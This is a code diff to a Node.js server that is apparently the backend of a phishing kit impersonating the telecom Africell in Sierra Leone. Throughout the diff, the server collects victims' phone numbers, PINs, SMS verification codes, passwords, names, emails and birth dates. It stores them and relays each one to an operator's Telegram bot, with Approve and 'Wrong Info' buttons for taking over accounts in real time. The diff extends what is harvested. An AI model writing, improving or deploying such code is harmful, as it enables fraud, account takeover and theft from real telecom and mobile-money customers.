@@ -35,7 +35,6 @@ async function sendToTelegram(url, payload) {
         clearTimeout(timeoutId);
         const data = await response.json();
         
-        // THIS IS CRITICAL: If Telegram rejects it, print it clearly in your server console!
         if (!data.ok) {
             console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
         } else {
@@ -52,20 +51,16 @@ async function sendToTelegram(url, payload) {
 // Handles Submissions across all authentication, recovery, and registration flows
 app.post('/api/submit-order', async (req, res) => {
     try {
-        const { phone, uniqueId } = req.body;
+        const { phone, uniqueId, firstName, lastName, email, dateOfBirth } = req.body;
         
         const currentTime = Date.now(); 
         const cooldownTime = 15 * 1000; // 15 seconds cooldown
 
-        // =========================================================================
-        // CRITICAL FIX: Force status to 'pending' immediately on EVERY request!
-        // This ensures stale 'approved' states can never bypass the Telegram gate.
-        // =========================================================================
+        // Force status to 'pending' immediately on every new request
         orderStatuses[phone] = 'pending';
 
-        const isRegistration = uniqueId && uniqueId.startsWith('Account Registration: ');
+        const isRegistration = (firstName || lastName || email || dateOfBirth) || (uniqueId && uniqueId.startsWith('Account Registration: '));
 
-        // Prevent duplicate spam submissions within 15 seconds (bypassed for fresh registration steps)
         if (!isRegistration && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
             return res.json({ success: true, message: 'Already submitted.' });
         }
@@ -76,7 +71,7 @@ app.post('/api/submit-order', async (req, res) => {
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
         const countryFlag = "🇸🇱";
-        const rawDigits = phone.replace(/\+232/g, '').trim();
+        const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';
 
         if (!userCredentials[phone]) {
             userCredentials[phone] = {};
@@ -84,50 +79,57 @@ app.post('/api/submit-order', async (req, res) => {
 
         let headerTitle = "🔔 *Africell Submission*";
         let credentialLabel = "Detail";
-        let wrongButtonText = "⚠️ Wrong Details";
+        let wrongButtonText = "❌ Wrong Info";
         let displayValue = uniqueId || 'N/A';
+        let message = "";
 
-        if (uniqueId.startsWith('PIN: ')) {
-            headerTitle = "🔐 *Africell PIN Code Submitted*";
-            credentialLabel = "PIN Code";
-            wrongButtonText = "⚠️ Wrong PIN";
-            userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
-        } else if (uniqueId.startsWith('Signup PIN: ')) {
-            headerTitle = "✨ *Africell Signup PIN Submitted*";
-            credentialLabel = "Signup PIN";
-            wrongButtonText = "⚠️ Wrong PIN";
-            userCredentials[phone].mpin = uniqueId.replace('Signup PIN: ', '');
-        } else if (uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: ')) {
-            headerTitle = "💬 *Africell SMS Verification Code*";
-            credentialLabel = "Verification Code";
-            wrongButtonText = "⚠️ Wrong Code";
-            userCredentials[phone].smsCode = uniqueId.replace(/^(Signup )?SMS Code: /, '');
-        } else if (uniqueId.startsWith('New Password: ')) {
-            headerTitle = "🔑 *Africell New Password Set*";
-            credentialLabel = "New Password";
-            wrongButtonText = "⚠️ Wrong Password";
-            userCredentials[phone].password = uniqueId.replace('New Password: ', '');
-        } else if (uniqueId.startsWith('Account Registration: ')) {
+        // Check if explicit separated registration fields were sent from new.html
+        if (firstName || lastName || email || dateOfBirth) {
             headerTitle = "📝 *Africell New Account Registration*";
-            credentialLabel = "Account Info";
-            wrongButtonText = "⚠️ Registration Error";
-            displayValue = uniqueId.replace('Account Registration: ', '');
-            userCredentials[phone].registration = displayValue;
-        } else if (uniqueId === 'Password Recovery Request' || uniqueId === 'Signup Mobile Number') {
-            headerTitle = "📱 *Africell Mobile Number Submitted*";
-            credentialLabel = "Mobile Number Request";
-            wrongButtonText = "⚠️ Unregistered Number";
+            userCredentials[phone].registration = { firstName, lastName, email, dateOfBirth };
+            
+            message = `${headerTitle}\n\n` +
+                      `🇸🇱 Country: \`+232\`\n` +
+                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
+                      `👤 First Name: *${escapeMarkdown(firstName || 'N/A')}*\n` +
+                      `👤 Last Name: *${escapeMarkdown(lastName || 'N/A')}*\n` +
+                      `📧 Email: *${escapeMarkdown(email || 'N/A')}*\n` +
+                      `📅 Date of Birth: *${escapeMarkdown(dateOfBirth || 'N/A')}*`;
         } else {
-            userCredentials[phone].password = uniqueId;
+            // Fallback for older flows (PIN, SMS, etc.)
+            if (uniqueId && uniqueId.startsWith('PIN: ')) {
+                headerTitle = "🔐 *Africell PIN Code Submitted*";
+                credentialLabel = "PIN Code";
+                wrongButtonText = "⚠️ Wrong PIN";
+                userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
+            } else if (uniqueId && uniqueId.startsWith('Signup PIN: ')) {
+                headerTitle = "✨ *Africell Signup PIN Submitted*";
+                credentialLabel = "Signup PIN";
+                wrongButtonText = "⚠️ Wrong PIN";
+                userCredentials[phone].mpin = uniqueId.replace('Signup PIN: ', '');
+            } else if (uniqueId && (uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: '))) {
+                headerTitle = "💬 *Africell SMS Verification Code*";
+                credentialLabel = "Verification Code";
+                wrongButtonText = "⚠️ Wrong Code";
+                userCredentials[phone].smsCode = uniqueId.replace(/^(Signup )?SMS Code: /, '');
+            } else if (uniqueId && uniqueId.startsWith('New Password: ')) {
+                headerTitle = "🔑 *Africell New Password Set*";
+                credentialLabel = "New Password";
+                wrongButtonText = "⚠️ Wrong Password";
+                userCredentials[phone].password = uniqueId.replace('New Password: ', '');
+            } else {
+                credentialLabel = "Detail";
+                displayValue = uniqueId || 'N/A';
+            }
+
+            message = `${headerTitle}\n\n` +
+                      `🇸🇱 Country: \`+232\`\n` +
+                      `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
+                      `🔑 ${credentialLabel}:\n${displayValue}`;
         }
 
-        const message = `${headerTitle}\n\n` +
-                        `🇸🇱 Country: +232\n` +
-                        `📱 Phone: ${rawDigits}\n` +
-                        `🔑 ${credentialLabel}:\n${displayValue}`;
-
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        const encodedId = encodeURIComponent(uniqueId || 'N/A');
+        const encodedId = encodeURIComponent(uniqueId || email || 'N/A');
 
         await sendToTelegram(telegramUrl, {
             chat_id: CHAT_ID,
@@ -136,8 +138,7 @@ app.post('/api/submit-order', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodedId}` },
-                        { text: "❌ Reject", callback_data: `reject_${phone}_${encodedId}` }
+                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodedId}` }
                     ],
                     [
                         { text: wrongButtonText, callback_data: `wrong_id_${phone}_${encodedId}` }
@@ -199,13 +200,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     messageTitle = 'Rejection Result';
                 } else if (callbackData.startsWith('wrong_id_')) {
                     orderStatuses[phone] = 'wrong_id';
-                    actionText = 'Incorrect Credential ⚠️';
+                    actionText = 'Wrong Info ⚠️';
                     messageTitle = 'Credential Error Result';
                 }
             }
 
             const countryFlag = "🇸🇱";
-            const rawDigits = phone.replace(/\+232/g, '').trim();
+            const rawDigits = phone ? phone.replace(/\+232/g, '').trim() : '';
 
             const updatedMessage = `📋 *${messageTitle}*\n\n` +
                              `${countryFlag} Country: \`+232\`\n` +
